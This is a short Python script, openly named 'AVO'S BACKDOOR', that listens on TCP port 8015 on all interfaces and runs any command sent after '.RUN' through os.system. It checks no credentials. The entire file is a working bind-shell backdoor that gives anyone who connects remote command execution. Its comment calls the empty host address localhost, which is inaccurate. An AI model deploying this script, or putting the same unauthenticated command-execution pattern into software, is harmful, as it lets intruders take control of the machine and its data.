import socket
import os
import sys

HOST = ''  # Standard loopback interface address (localhost)

PORT = 8015        # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        conn.sendall(b"AVO'S BACKDOOR. Type .HELP to view commands\r\n")
        while True:
            data = conn.recv(1024).decode()            
            data = data.strip()

            command = data.split(' ')
            if not data:                
                break
            if('.RUN' in data):
                command = data.replace(".RUN", '').strip()
                os.system(command)
            elif(data == '.HELP'):
                conn.sendall(b".RUN <command>\r\n")
                conn.sendall(b".EXIT\r\n")            
            elif(data == '.EXIT'):
                conn.sendall(b"Disconnect.")
                conn.close()
                sys.exit(0)
            else:
                conn.sendall(b"Invalid Command.")
     
     